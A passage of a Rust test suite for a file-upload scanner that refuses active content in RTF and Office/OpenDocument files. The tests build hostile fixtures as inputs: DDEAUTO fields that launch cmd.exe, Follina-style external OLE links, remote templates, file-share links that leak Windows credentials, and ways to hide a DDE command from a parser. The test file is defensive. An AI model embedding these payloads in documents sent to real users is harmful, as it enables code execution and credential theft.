        b"{\\rtf1{\\field{\\*\\fldinst INCLUDEPICTURE \"https://x.example/a.png\"}{\\fldrslt x}}}",
        // odd case, and the name split across groups
        b"{\\rtf1{\\field{\\*\\fldinst iNcLuDePiCtUrE \"file://host/share/a.png\"}{\\fldrslt x}}}",
        b"{\\rtf1{\\field{\\*\\fldinst {INCLUDE}{\\b PICTURE} \"file://host/share/a.png\"}{\\fldrslt x}}}",
        b"{\\rtf1{\\field{\\*\\fldinst {\\rtlch INCLUDE}{\\insrsid1 TEXT}{ \"file://host/a\"}}{\\fldrslt x}}}",
        // a link to a share, to a file, with no scheme, with a second address or a switch
        b"{\\rtf1{\\field{\\*\\fldinst HYPERLINK \"file://host/share/a.docx\"}{\\fldrslt x}}}",
        b"{\\rtf1{\\field{\\*\\fldinst HYPERLINK \"\\\\\\\\host\\\\share\"}{\\fldrslt x}}}",
        b"{\\rtf1{\\field{\\*\\fldinst HYPERLINK a.docx}{\\fldrslt x}}}",
        b"{\\rtf1{\\field{\\*\\fldinst HYPERLINK \"https://a.org/\" \"file://host/a\"}{\\fldrslt x}}}",
        b"{\\rtf1{\\field{\\*\\fldinst HYPERLINK \"https://a.org/\"\"file://host/a\"}{\\fldrslt x}}}",
        b"{\\rtf1{\\field{\\*\\fldinst HYPERLINK \"https://a.org/\" \\\\o \"tip\"}{\\fldrslt x}}}",
        b"{\\rtf1{\\field{\\*\\fldinst HYPERLINK \\\\l \"_Toc1\"}{\\fldrslt x}}}",
        // the scheme split from a share by a control symbol, a space or a tab in the address, `HYPERLINK` glued on
        b"{\\rtf1{\\field{\\*\\fldinst HYPERLINK http://\\\\host\\\\share}{\\fldrslt x}}}",
        b"{\\rtf1{\\field{\\*\\fldinst HYPERLINK \"https://a.org/ b\"}{\\fldrslt x}}}",
        b"{\\rtf1{\\field{\\*\\fldinst HYPERLINK\thttps://a.org/}{\\fldrslt x}}}",
        b"{\\rtf1{\\field{\\*\\fldinst HYPERLINK\\~https://a.org/}{\\fldrslt x}}}",
        b"{\\rtf1{\\field{\\*\\fldinst HYPERLINKhttps://a.org/}{\\fldrslt x}}}",
        // review: a link as Word writes it, with a `\\*\\datafield` group in its instruction (refused since round 4),
        // and a tab after a link, which only a space may follow
        b"{\\rtf1{\\field{\\*\\fldinst {\\rtlch\\fcs1 \\af0 \\insrsid1 HYPERLINK \"https://a.org/\" }{\\rtlch\\fcs1 {\\*\\datafield 00d0c9ea79f9bace118c8200aa004ba90b02000000}}}{\\fldrslt here}}}",
        b"{\\rtf1{\\field{\\*\\fldinst HYPERLINK https://a.org/\t}{\\fldrslt x}}}",
        // fields that load nothing are refused too: a page number, a table of contents' page reference, DDE
        b"{\\rtf1{\\field{\\*\\fldinst {\\rtlch\\fcs1 PAGE}}{\\fldrslt 1}}}",
        b"{\\rtf1{\\field{\\*\\fldinst PAGEREF _Toc1 \\\\h }{\\fldrslt 1}}}",
        b"{\\rtf1{\\field{\\*\\fldinst DDEAUTO calc}{\\fldrslt 0}}}",
        // a link field nested in another's result is checked on its own
        b"{\\rtf1{\\field{\\*\\fldinst HYPERLINK https://a.org/}{\\fldrslt {\\field{\\*\\fldinst INCLUDETEXT file://host/a}{\\fldrslt 1}}}}}",
    ] {
        refused("x.rtf", active, RTF_ACTIVE);
    }
    for link in [
        &b"{\\rtf1{\\field{\\*\\fldinst HYPERLINK \"https://example.com/a?b=c&d#e\"}{\\fldrslt here}}}"[..],
        b"{\\rtf1{\\field{\\*\\fldinst  hyperlink  HTTP://A.ORG/ }{\\fldrslt here}}}",
        b"{\\rtf1{\\field{\\*\\fldinst {HYPER}{\\b LINK} {\"mailto:ada@example.org\"}}{\\fldrslt Ada}}}",
        // a field with no instruction, or an empty one, does nothing
        b"{\\rtf1{\\field{\\fldrslt x}}}",
        b"{\\rtf1{\\field{\\*\\fldinst {\\b  }}{\\fldrslt x}}}",
    ] {
        ok("x.rtf", link);
    }
}

/// Codex round 3: about 800 KB of `fldinst ` after `{\\rtf1 ` is decided at once (the step bound itself is
/// asserted in the unit test `rtf_is_decided_in_one_bounded_pass`).
#[test]
fn a_large_rtf_is_decided_quickly() {
    let started = std::time::Instant::now();
    let codex = [&b"{\\rtf1 "[..], &b"fldinst ".repeat(100_000)].concat();
    refused("x.rtf", &codex, NOT_WHOLE);
    ok("x.rtf", &[codex.as_slice(), b"}"].concat());
    assert!(started.elapsed() < std::time::Duration::from_secs(5), "{:?}", started.elapsed());
}

#[test]
fn an_ole_object_in_a_docx_is_refused_whatever_it_is_called() {
    let docx = fixture("notes.docx");
    let rels = "word/_rels/document.xml.rels";
    let ole = format!(r#"<Relationship Id="rId99" Type="{REL}/oleObject" Target="embeddings/payload.bin"/>"#);
    // Codex round 2: word/embeddings/payload.bin, referenced by a compressed oleObject relationship
    let xml = entry(&docx, rels).replace("</Relationships>", &format!("{ole}</Relationships>"));
    let codex = rezip(&docx, &[(rels, xml.as_bytes()), ("word/embeddings/payload.bin", b"MZ\x90\0 a packaged program")]);
    refused("notes.docx", &codex, OFFICE_ACTIVE);
    // the same object stored where no name gives it away: only the relationship says what it is
    let quiet_rel = format!(r#"<Relationship Id="rId99" Type="{REL}/oleObject" Target="media/image9.png"/>"#);
    let quiet = rezip(&with_rel(&docx, rels, &quiet_rel), &[("word/media/image9.png", b"MZ\x90\0")]);
    refused("notes.docx", &quiet, OFFICE_ACTIVE);
    // the relationship type spelled with a character reference, as Word reads it
    let escaped = format!(r#"<Relationship Id="rId99" Type="{REL}/&#111;le&#x4F;bject" Target="media/image9.png"/>"#);
    refused("notes.docx", &with_rel(&docx, rels, &escaped), OFFICE_ACTIVE);
    // only the content types say it
    let types = entry(&docx, "[Content_Types].xml").replace("</Types>", r#"<Default Extension="dat" ContentType="application/vnd.openxmlformats-officedocument.oleObject"/></Types>"#);
    refused("notes.docx", &rezip(&docx, &[("[Content_Types].xml", types.as_bytes())]), OFFICE_ACTIVE);
}

#[test]
fn office_code_controls_and_outside_links_are_refused() {
    let docx = fixture("notes.docx");
    let rels = "word/_rels/document.xml.rels";
    for rel in [
        // Follina (CVE-2022-30190): an external OLE object
        format!(r#"<Relationship Id="rId90" Type="{REL}/oleObject" Target="mhtml:http://x.example/!x-usc:http://x.example/" TargetMode="External"/>"#),
        // a remote template
        format!(r#"<Relationship Id="rId91" Type="{REL}/attachedTemplate" Target="http://x.example/t.dotm" TargetMode="External"/>"#),
        // a linked image: Windows fetches it, and sends the user's credentials to a file share
        format!(r#"<Relationship Id="rId92" Type="{REL}/image" Target="\\x.example\share\a.png" TargetMode="External"/>"#),
        format!(r#"<Relationship Id="rId93" Type="{REL}/control" Target="activeX/ctl1.xml"/>"#),
        format!(r#"<Relationship Id="rId94" Type="{REL}/package" Target="media/sheet.xlsx"/>"#),
        r#"<Relationship Id="rId95" Type="http://schemas.microsoft.com/office/2006/relationships/vbaProject" Target="vbaProj.dat"/>"#.to_string(),
        format!(r#"<Relationship Id="rId96" Type="{REL}/aFChunk" Target="chunk.mht"/>"#),
    ] {
        refused("notes.docx", &with_rel(&docx, rels, &rel), OFFICE_ACTIVE);
    }
    // review: a prefixed decoy attribute doesn't hide the real type or mode
    for rel in [
        format!(r#"<Relationship xmlns:x="urn:x" Id="rId98" x:Type="{REL}/hyperlink" Type="{REL}/oleObject" Target="media/a.bin"/>"#),
        format!(r#"<Relationship xmlns:x="urn:x" Id="rId98" Type="{REL}/image" Target="http://x.example/a.png" x:TargetMode="Internal" TargetMode="External"/>"#),
    ] {
        refused("notes.docx", &with_rel(&docx, rels, &rel), OFFICE_ACTIVE);
    }
    // an ordinary web link is fine
    let link = format!(r#"<Relationship Id="rId97" Type="{REL}/hyperlink" Target="https://example.com/" TargetMode="External"/>"#);
    ok("notes.docx", &with_rel(&docx, rels, &link));
    // parts that are code, by name
    for part in ["word/vbaProject.bin", "word/activeX/activeX1.xml", "word/VBADATA.xml"] {
        refused("notes.docx", &rezip(&docx, &[(part, b"x")]), OFFICE_ACTIVE);
    }
    // a macro-enabled document named .docx
    let types = entry(&docx, "[Content_Types].xml").replace("wordprocessingml.document.main+xml", "ms-word.document.macroEnabled.main+xml");
    refused("notes.docx", &rezip(&docx, &[("[Content_Types].xml", types.as_bytes())]), OFFICE_ACTIVE);
    // a workbook link (where a spreadsheet keeps DDE)
    let xlsx = fixture("sheet.xlsx");
    let types = entry(&xlsx, "[Content_Types].xml").replace("</Types>", r#"<Override PartName="/xl/externalLinks/externalLink1.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.externalLink+xml"/></Types>"#);
    refused("sheet.xlsx", &rezip(&xlsx, &[("[Content_Types].xml", types.as_bytes())]), OFFICE_ACTIVE);
    // ActiveX in a presentation
    refused("notes.pptx", &rezip(&fixture("notes.pptx"), &[("ppt/activeX/activeX1.xml", b"<x/>")]), OFFICE_ACTIVE);
}

/// A field in any part is refused, whatever it says. Rounds 1 to 6 read a field's instruction and refused DDE,
/// and each round found a way to make the instruction a reader runs differ from the one we read: pieces split
/// across runs, a markup-compatibility branch (round 5), deleted field code (round 6), a nested field's result,
/// text in an ordinary run, hidden text (round 6's review). A simple field, whose instruction is one attribute,
/// can still load from outside (`INCLUDEPICTURE` from a file share sends the user's Windows credentials). These
/// parts declare no markup compatibility unless a case says so.
#[test]
fn a_field_in_a_docx_is_refused_whatever_it_says() {
    let docx = fixture("notes.docx");
    let bare = without_markup_compatibility(&entry(&docx, "word/document.xml"));
    assert!(!bare.contains("markup-compatibility"), "no compatibility namespace left");
    let with = |xml: &str| {
        let doc = bare.replacen("<w:r>", &format!("{xml}<w:r>"), 1);
        assert!(doc != bare, "the field went in");
        rezip(&docx, &[("word/document.xml", doc.as_bytes())])
    };
    let complex = |runs: &str| with(&format!(r#"<w:r><w:fldChar w:fldCharType="begin"/></w:r>{runs}<w:r><w:fldChar w:fldCharType="end"/></w:r>"#));
    // DDE split across runs, two fields in a row, an escaped letter (rounds 1 and 2)
    refused("notes.docx", &complex(r#"<w:r><w:instrText>DD</w:instrText></w:r><w:r><w:instrText xml:space="preserve">EAUTO c:\\windows\\system32\\cmd.exe "/k calc"</w:instrText></w:r>"#), OFFICE_ACTIVE);
    refused("notes.docx", &with(r#"<w:r><w:fldChar w:fldCharType="begin"/><w:instrText>PAGE</w:instrText><w:fldChar w:fldCharType="end"/></w:r><w:r><w:fldChar w:fldCharType="begin"/><w:instrText>DDEAUTO c:\\x.exe</w:instrText><w:fldChar w:fldCharType="end"/></w:r>"#), OFFICE_ACTIVE);
    refused("notes.docx", &complex("<w:r><w:instrText>&#68;DEAUTO calc</w:instrText></w:r>"), OFFICE_ACTIVE);
    // Codex round 6's exact payload: deleted field code `x` between `DD` and `EAUTO calc`; a reader leaves deleted
    // code out and runs `DDEAUTO calc`
    refused("notes.docx", &complex(r#"<w:r><w:instrText>DD</w:instrText></w:r><w:del w:id="1" w:author="A"><w:r><w:delInstrText>x</w:delInstrText></w:r></w:del><w:r><w:instrText>EAUTO calc</w:instrText></w:r>"#), OFFICE_ACTIVE);
    // our variants: an inserted run (gone to a reader that rejects changes), a moved-from run (gone once the move
    // is accepted)
    refused("notes.docx", &complex(r#"<w:r><w:instrText>DD</w:instrText></w:r><w:ins w:id="1" w:author="A"><w:r><w:instrText>x</w:instrText></w:r></w:ins><w:r><w:instrText>EAUTO calc</w:instrText></w:r>"#), OFFICE_ACTIVE);
    refused("notes.docx", &complex(r#"<w:r><w:instrText>DD</w:instrText></w:r><w:moveFrom w:id="1" w:author="A"><w:r><w:instrText>x</w:instrText></w:r></w:moveFrom><w:r><w:instrText>EAUTO calc</w:instrText></w:r>"#), OFFICE_ACTIVE);
    // round 6's review: a nested field whose result Word puts into the outer instruction (`QUOTE`, a published
    // DDE disguise); text in a `w:t` run, which LibreOffice adds to the instruction; hidden text
    refused("notes.docx", &complex(r#"<w:r><w:instrText>DD</w:instrText></w:r><w:r><w:fldChar w:fldCharType="begin"/></w:r><w:r><w:instrText>QUOTE "E"</w:instrText></w:r><w:r><w:fldChar w:fldCharType="separate"/></w:r><w:r><w:t>E</w:t></w:r><w:r><w:fldChar w:fldCharType="end"/></w:r><w:r><w:instrText>AUTO calc</w:instrText></w:r>"#), OFFICE_ACTIVE);
    refused("notes.docx", &complex(r#"<w:r><w:instrText>DD</w:instrText></w:r><w:r><w:t>E</w:t></w:r><w:r><w:instrText>AUTO calc</w:instrText></w:r>"#), OFFICE_ACTIVE);
    refused("notes.docx", &complex(r#"<w:r><w:instrText>DD</w:instrText></w:r><w:r><w:rPr><w:vanish/></w:rPr><w:instrText>x</w:instrText></w:r><w:r><w:instrText>EAUTO calc</w:instrText></w:r>"#), OFFICE_ACTIVE);
    // simple fields: DDE, a prefixed decoy attribute, an escaped letter, a soft hyphen in the command, and
    // pictures, text or objects loaded from a file share
    for instr in [r#"w:instr=" DDE c:\\x.exe a b""#, r#"xmlns:x="urn:x" x:instr="PAGE" w:instr="DDEAUTO calc""#, r#"w:instr="&#68;DEAUTO calc""#, r#"w:instr="DD&#173;EAUTO calc""#, r#"w:instr="INCLUDEPICTURE &quot;\\\\host\\share\\x.png&quot; \d""#, r#"w:instr="INCLUDETEXT &quot;\\\\host\\share\\x.docx&quot;""#, r#"w:instr="LINK Excel.Sheet.12 &quot;\\\\host\\share\\x.xlsx&quot; Sheet1""#] {
        refused("notes.docx", &with(&format!("<w:fldSimple {instr}/>")), OFFICE_ACTIVE);
    }
    // and an ordinary page number, simple or complex
    refused("notes.docx", &with(r#"<w:fldSimple w:instr=" PAGE "><w:r><w:t>1</w:t></w:r></w:fldSimple>"#), OFFICE_ACTIVE);
    refused("notes.docx", &complex("<w:r><w:instrText> PAGE </w:instrText></w:r>"), OFFICE_ACTIVE);
    // each piece of a field alone is one: `instrText` or `delInstrText` with no `fldChar` around it, `fldChar`s
    // with no instruction, an empty `fldSimple`, with an undeclared prefix
    for piece in ["<w:r><w:instrText>PAGE</w:instrText></w:r>", "<w:r><w:delInstrText>PAGE</w:delInstrText></w:r>", r#"<w:r><w:fldChar w:fldCharType="begin"/><w:fldChar w:fldCharType="end"/></w:r>"#, "<w:fldSimple/>", "<zz:fldSimple/>"] {
        refused("notes.docx", &with(piece), OFFICE_ACTIVE);
    }
    // tracked changes, or a markup-compatibility branch, with no field are fine
    ok("notes.docx", &with(r#"<w:ins w:id="1" w:author="A"><w:r><w:t>new</w:t></w:r></w:ins><w:del w:id="2" w:author="A"><w:r><w:delText>old</w:delText></w:r></w:del>"#));
    ok("notes.docx", &with(r#"<mc:AlternateContent xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006"><mc:Choice Requires="w14"><w:r><w:t>hi</w:t></w:r></mc:Choice><mc:Fallback><w:r><w:t>hi</w:t></w:r></mc:Fallback></mc:AlternateContent>"#));
    ok("notes.pptx", &fixture("notes.pptx"));
}

/// The document with its markup-compatibility namespace declaration and `mc:Ignorable` list removed. Round 6's
/// brief asked for regressions with no compatibility declaration, so that a compatibility rule (round 5 had one)
/// can't be what refuses them.
fn without_markup_compatibility(doc: &str) -> String {
    doc.replace(r#" xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006""#, "")
        .replace(r#" mc:Ignorable="w14 wp14 w15""#, "")
}

/// Codex round 5: `mc:AlternateContent` holds branches a reader chooses between; an `instrText` run in a branch
/// the reader drops is decoy to it, so the command it runs can differ from the runs we join. Round 5 refused a
/// field in a part that uses markup compatibility; since round 6 a field is refused anywhere, and these stay as
/// regressions.
#[test]
fn a_field_in_a_markup_compatible_part() {
    let docx = fixture("notes.docx");
    let bare = without_markup_compatibility(&entry(&docx, "word/document.xml"));
    let complex = |runs: &str| {
        let doc = bare.replacen("<w:r>", &format!("<w:r><w:fldChar w:fldCharType=\"begin\"/></w:r>{runs}<w:r><w:fldChar w:fldCharType=\"end\"/></w:r><w:r>"), 1);
        assert!(doc != bare, "the field went in");
        doc
    };
    let mc = r#"xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006""#;
    // Codex's exact decoy: a dropped branch inserts `x` so the joined runs read `ddxeauto calc`, not DDE
    let decoy = complex(&format!(r#"<w:r><w:instrText>DD</w:instrText></w:r><mc:AlternateContent {mc}><mc:Choice Requires="x"><w:r><w:instrText>x</w:instrText></w:r></mc:Choice><mc:Fallback/></mc:AlternateContent><w:r><w:instrText>EAUTO calc</w:instrText></w:r>"#));
    // a page number in a part that declares the namespace, `mc:ProcessContent`, the namespace under another
    // prefix, the construct with its namespace undeclared
    let page = complex("<w:r><w:instrText> PAGE </w:instrText></w:r>").replacen("<w:document ", &format!("<w:document {mc} mc:Ignorable=\"w14\" "), 1);
    let proc = complex(r#"<w:r><w:instrText>PAGE</w:instrText><x:ext xmlns:x="urn:x" mc:ProcessContent="x"/></w:r>"#).replacen("<w:document ", &format!("<w:document {mc} "), 1);
    let aliased = complex("<w:r><w:instrText>PAGE</w:instrText></w:r>").replacen("<w:document ", "<w:document xmlns:compat=\"http://schemas.openxmlformats.org/markup-compatibility/2006\" ", 1);
    let undeclared = complex(r#"<mc:AlternateContent><mc:Choice><w:r><w:instrText>x</w:instrText></w:r></mc:Choice><mc:Fallback/></mc:AlternateContent>"#);
    let ignorable = complex(r#"<w:r><w:instrText>PAGE</w:instrText><w:ext mc:Ignorable="w14"/></w:r>"#);
    for doc in [decoy, page, proc, aliased, undeclared, ignorable] {
        refused("notes.docx", &rezip(&docx, &[("word/document.xml", doc.as_bytes())]), OFFICE_ACTIVE);
    }
}

/// `base` with entries renamed (`from`, `to`), contents and order kept.
fn renamed(base: &[u8], renames: &[(&str, &str)]) -> Vec<u8> {
    let mut z = ZipArchive::new(Cursor::new(base)).unwrap();
    let mut w = ZipWriter::new(Cursor::new(Vec::new()));
    for i in 0..z.len() {
        let mut f = z.by_index(i).unwrap();
        let name = renames.iter().find(|(from, _)| *from == f.name()).map_or(f.name().to_string(), |(_, to)| to.to_string());
        let mut data = Vec::new();
        f.read_to_end(&mut data).unwrap();
        w.start_file(name, SimpleFileOptions::default().compression_method(CompressionMethod::Deflated)).unwrap();
        w.write_all(&data).unwrap();
    }
    w.finish().unwrap().into_inner()
}

#[test]
fn a_dde_field_is_found_whatever_the_word_part_is_called() {
    let docx = fixture("notes.docx");
    let doc = entry(&docx, "word/document.xml");
    let dde = doc.replacen("<w:r>", r#"<w:fldSimple w:instr=" DDE c:\\x.exe a b"/><w:r>"#, 1);
    assert!(dde != doc);
    // Codex round 3: the main document renamed word/document.dat, with its content-type override and root
    // relationship following it, carrying a w:fldSimple DDE instruction
    let moved = renamed(&docx, &[("word/document.xml", "word/document.dat"), ("word/_rels/document.xml.rels", "word/_rels/document.dat.rels")]);
    let types = entry(&docx, "[Content_Types].xml").replace("/word/document.xml", "/word/document.dat");
    let root = entry(&docx, "_rels/.rels").replace("word/document.xml", "word/document.dat");
    let parts = |main: &str| rezip(&moved, &[("word/document.dat", main.as_bytes()), ("[Content_Types].xml", types.as_bytes()), ("_rels/.rels", root.as_bytes())]);
    ok("notes.docx", &parts(&doc));
    refused("notes.docx", &parts(&dde), OFFICE_ACTIVE);
    // a header with an extension of its own, typed only by a Default
    let rels = "word/_rels/document.xml.rels";
    let header = r#"<w:hdr xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:p><w:fldSimple w:instr="DDEAUTO calc"/></w:p></w:hdr>"#;
    let typed = entry(&docx, "[Content_Types].xml").replace("</Types>", r#"<Default Extension="hdat" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.header+xml"/></Types>"#);
    let with_header = with_rel(&docx, rels, &format!(r#"<Relationship Id="rId80" Type="{REL}/header" Target="header9.hdat"/>"#));
    refused("notes.docx", &rezip(&with_header, &[("[Content_Types].xml", typed.as_bytes()), ("word/header9.hdat", header.as_bytes())]), OFFICE_ACTIVE);
    // the same header declared as a picture, and one with no content type at all: XML is read as XML
    let as_png = entry(&docx, "[Content_Types].xml").replace("</Types>", r#"<Override PartName="/word/header9.png" ContentType="image/png"/></Types>"#);
    let png_rel = with_rel(&docx, rels, &format!(r#"<Relationship Id="rId80" Type="{REL}/header" Target="header9.png"/>"#));
    refused("notes.docx", &rezip(&png_rel, &[("[Content_Types].xml", as_png.as_bytes()), ("word/header9.png", header.as_bytes())]), OFFICE_ACTIVE);
    let bare_rel = with_rel(&docx, rels, &format!(r#"<Relationship Id="rId80" Type="{REL}/header" Target="header9"/>"#));
    refused("notes.docx", &rezip(&bare_rel, &[("word/header9", header.as_bytes())]), OFFICE_ACTIVE);
    // UTF-16 with no byte-order mark still reads as XML: refused, not skipped
    let utf16: Vec<u8> = header.encode_utf16().flat_map(u16::to_le_bytes).collect();
    refused("notes.docx", &rezip(&bare_rel, &[("word/header9", &utf16)]), NOT_WHOLE);
    // the root relationship must lead to a part that is there
    let lost = entry(&docx, "_rels/.rels").replace("word/document.xml", "word/missing.xml");
    refused("notes.docx", &rezip(&docx, &[("_rels/.rels", lost.as_bytes())]), NOT_WHOLE);
    // a DDE field in a spreadsheet or presentation part is caught too
    let xlsx = fixture("sheet.xlsx");
    refused("sheet.xlsx", &rezip(&xlsx, &[("xl/notes.dat", header.as_bytes())]), OFFICE_ACTIVE);
    let pptx = fixture("notes.pptx");
    refused("notes.pptx", &rezip(&pptx, &[("ppt/notes.dat", header.as_bytes())]), OFFICE_ACTIVE);
    // a picture stays a picture
    ok("notes.docx", &rezip(&docx, &[("word/media/image1.png", &fixture("photo.png"))]));
    // review: parts Office types as `application/vnd.openxmlformats-…` but that aren't XML (printer settings, an
    // obfuscated font) are not read as XML
    let devmode: Vec<u8> = "Microsoft Print to PDF".encode_utf16().flat_map(u16::to_le_bytes).chain([0u8; 40]).collect();
    let xl_types = entry(&xlsx, "[Content_Types].xml").replace("</Types>", r#"<Default Extension="bin" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.printerSettings"/></Types>"#);
    ok("sheet.xlsx", &rezip(&xlsx, &[("[Content_Types].xml", xl_types.as_bytes()), ("xl/printerSettings/printerSettings1.bin", &devmode)]));
    let font: Vec<u8> = (0..64u8).map(|i| i.wrapping_mul(37) ^ 0x9A).collect();
    let font_types = entry(&docx, "[Content_Types].xml").replace("</Types>", r#"<Default Extension="odttf" ContentType="application/vnd.openxmlformats-officedocument.obfuscatedFont"/></Types>"#);
    ok("notes.docx", &rezip(&docx, &[("[Content_Types].xml", font_types.as_bytes()), ("word/fonts/font1.odttf", &font)]));
    // a main document whose name needs escaping in its relationship
    let spaced = renamed(&docx, &[("word/document.xml", "word/my document.xml")]);
    let types = entry(&docx, "[Content_Types].xml").replace("/word/document.xml", "/word/my%20document.xml");
    let root = entry(&docx, "_rels/.rels").replace("word/document.xml", "word/my%20document.xml");
    ok("notes.docx", &rezip(&spaced, &[("[Content_Types].xml", types.as_bytes()), ("_rels/.rels", root.as_bytes())]));
}

/// Codex round 4: an override and a relationship kept their `%20` while the zip's name had a space, so the
/// main document was never parsed, yet counted as present and XML. Every name is now decoded the same way, and
/// the main document must be a part that was parsed.
#[test]
fn escaped_part_names_are_read_as_office_reads_them() {
    let docx = fixture("notes.docx");
    let types = entry(&docx, "[Content_Types].xml").replace("/word/document.xml", "/word/my%20document.dat");
    let root = entry(&docx, "_rels/.rels").replace("word/document.xml", "word/my%20document.dat");
    let moved = renamed(&docx, &[("word/document.xml", "word/my document.dat"), ("word/_rels/document.xml.rels", "word/_rels/my document.dat.rels")]);
    let parts = |main: &[u8]| rezip(&moved, &[("word/my document.dat", main), ("[Content_Types].xml", types.as_bytes()), ("_rels/.rels", root.as_bytes())]);
    // Codex's case: garbage under the decoded name, declared XML under the escaped one
    refused("notes.docx", &parts(b"garbage"), NOT_WHOLE);
    // the real document under that name still opens; with a DDE field it is still refused
    let doc = entry(&docx, "word/document.xml");
    ok("notes.docx", &parts(doc.as_bytes()));
    let dde = doc.replacen("<w:r>", r#"<w:fldSimple w:instr="DDEAUTO calc"/><w:r>"#, 1);
    refused("notes.docx", &parts(dde.as_bytes()), OFFICE_ACTIVE);
    // a declaration alone has no root element: nothing was parsed
    refused("notes.docx", &parts(b"<?xml version=\"1.0\"?>\n"), NOT_WHOLE);
    // two entries that are one part once decoded, each well-formed: which one a reader takes is anyone's guess
    refused("notes.docx", &rezip(&docx, &[("word/document%2Exml", doc.as_bytes())]), NOT_WHOLE);
    refused("notes.docx", &rezip(&parts(doc.as_bytes()), &[("word/my%20document.dat", doc.as_bytes())]), NOT_WHOLE);
    // the main document must be a part read as one: not the content types themselves
    let at_types = entry(&docx, "[Content_Types].xml").replace("/word/document.xml", "/[Content_Types].xml");
    let root_types = entry(&docx, "_rels/.rels").replace("word/document.xml", "/[Content_Types].xml");
    refused("notes.docx", &rezip(&docx, &[("[Content_Types].xml", at_types.as_bytes()), ("_rels/.rels", root_types.as_bytes())]), NOT_WHOLE);
    // XML is one root element: text alone, text after it, or a second root is not a part a reader parses
    let rels = "word/_rels/document.xml.rels";
    let xml = entry(&docx, rels);
    refused("notes.docx", &rezip(&docx, &[(rels, format!("{xml}x").as_bytes())]), NOT_WHOLE);
    refused("notes.docx", &rezip(&docx, &[(rels, format!("{xml}<Relationships/>").as_bytes())]), NOT_WHOLE);
    ok("notes.docx", &rezip(&docx, &[(rels, format!("<?xml version=\"1.0\"?>\r\n<!-- c -->{}\n", xml.trim_start_matches(|c| c != '>').trim_start_matches('>')).as_bytes())]));
    // review: an empty part passes (LibreOffice writes some) but is no main document; a form feed isn't XML
    // whitespace; an escaped `/` makes a name no part may have
    ok("notes.docx", &rezip(&docx, &[("word/empty.xml", b"")]));
    refused("notes.docx", &parts(b""), NOT_WHOLE);
    refused("notes.docx", &parts(&[b"\x0C", doc.as_bytes()].concat()), NOT_WHOLE);
    refused("notes.docx", &renamed(&docx, &[("word/document.xml", "word%2Fdocument.xml")]), NOT_WHOLE);
    ok("notes.odt", &rezip(&fixture("notes.odt"), &[("Configurations2/accelerator/current.xml", b"")]));
    // second review: but an OpenDocument's content and manifest are never empty
    refused("notes.odt", &rezip(&fixture("notes.odt"), &[("content.xml", b"")]), NOT_WHOLE);
    refused("notes.odt", &rezip(&fixture("notes.odt"), &[("META-INF/manifest.xml", b"")]), NOT_WHOLE);
    // second review: an escape is two hex digits, and never of a letter, digit, `-`, `.`, `_` or `~`
    refused("notes.docx", &rezip(&docx, &[("word/x%+5.xml", b"<x/>")]), NOT_WHOLE);
    let escaped_dot = entry(&docx, "_rels/.rels").replace("word/document.xml", "word/document%2Exml");
    refused("notes.docx", &rezip(&docx, &[("_rels/.rels", escaped_dot.as_bytes())]), NOT_WHOLE);
    // escapes that don't decode to UTF-8 can't be compared: refused
    let bad = entry(&docx, "[Content_Types].xml").replace("</Types>", r#"<Override PartName="/word/x%FF.xml" ContentType="application/xml"/></Types>"#);
    refused("notes.docx", &rezip(&docx, &[("[Content_Types].xml", bad.as_bytes())]), NOT_WHOLE);
}

#[test]
fn office_parts_uni_cannot_read_plainly_are_refused() {
    let docx = fixture("notes.docx");
    let rels = "word/_rels/document.xml.rels";
    let xml = entry(&docx, rels);
    // UTF-16, which the scan can't read: refused, not skipped
    let utf16: Vec<u8> = [&b"\xFF\xFE"[..], &xml.encode_utf16().flat_map(u16::to_le_bytes).collect::<Vec<u8>>()].concat();
    refused("notes.docx", &rezip(&docx, &[(rels, &utf16)]), NOT_WHOLE);
    // a DTD (entity tricks), or XML that isn't well-formed
    let dtd = xml.replacen("<Relationships", "<!DOCTYPE r [<!ENTITY o \"oleObject\">]><Relationships", 1);
    refused("notes.docx", &rezip(&docx, &[(rels, dtd.as_bytes())]), NOT_WHOLE);
    refused("notes.docx", &rezip(&docx, &[(rels, b"<Relationships><Relationship")]), NOT_WHOLE);
    // a relationship with no type
    let untyped = xml.replace("</Relationships>", r#"<Relationship Id="rId9" Target="x.bin"/></Relationships>"#);
    refused("notes.docx", &rezip(&docx, &[(rels, untyped.as_bytes())]), NOT_WHOLE);
    // two parts with one name (Office reads names without case)
    refused("notes.docx", &rezip(&docx, &[("WORD/_rels/document.xml.rels", xml.as_bytes())]), NOT_WHOLE);
}

#[test]
fn zip_limits_hold() {
    let docx = fixture("notes.docx");
    // data before the archive (a self-extracting program)
    refused("notes.docx", &[b"MZ\x90\0".as_slice(), &docx].concat(), "");
    // over 10 MiB that compresses more than 200 to 1
    refused("notes.docx", &rezip(&docx, &[("word/media/zeros.png", &vec![0u8; 11 << 20])]), NOT_WHOLE);
    // too many entries
    let many: Vec<(String, Vec<u8>)> = (0..10_001).map(|i| (format!("word/media/{i}.png"), vec![])).collect();
    let many: Vec<(&str, &[u8])> = many.iter().map(|(n, d)| (n.as_str(), d.as_slice())).collect();
    refused("notes.docx", &rezip(&docx, &many), NOT_WHOLE);
    // encrypted entries: the flag set in every local and central header
    let mut locked = docx.clone();
    for sig in [&b"PK\x03\x04"[..], b"PK\x01\x02"] {
        let flags = if sig[2] == 3 { 6 } else { 8 };
        let at: Vec<usize> = locked.windows(4).enumerate().filter(|(_, w)| *w == sig).map(|(i, _)| i).collect();
        for i in at {
            locked[i + flags] |= 1;
        }
    }
    refused("notes.docx", &locked, NOT_WHOLE);
}

#[test]
fn opendocument_macros_objects_and_script_bindings_are_refused() {
    let odt = fixture("notes.odt");
    refused("notes.odt", &rezip(&odt, &[("Basic/Standard/Module1.xml", b"<x/>")]), ODF_ACTIVE);
    refused("notes.odt", &rezip(&odt, &[("Scripts/python/a.py", b"import os")]), ODF_ACTIVE);
    let manifest = entry(&odt, "META-INF/manifest.xml");
    let ole = manifest.replace("</manifest:manifest>", r#"<manifest:file-entry manifest:full-path="Object 1" manifest:media-type="application/vnd.sun.star.oleobject"/></manifest:manifest>"#);
    refused("notes.odt", &rezip(&odt, &[("META-INF/manifest.xml", ole.as_bytes())]), ODF_ACTIVE);
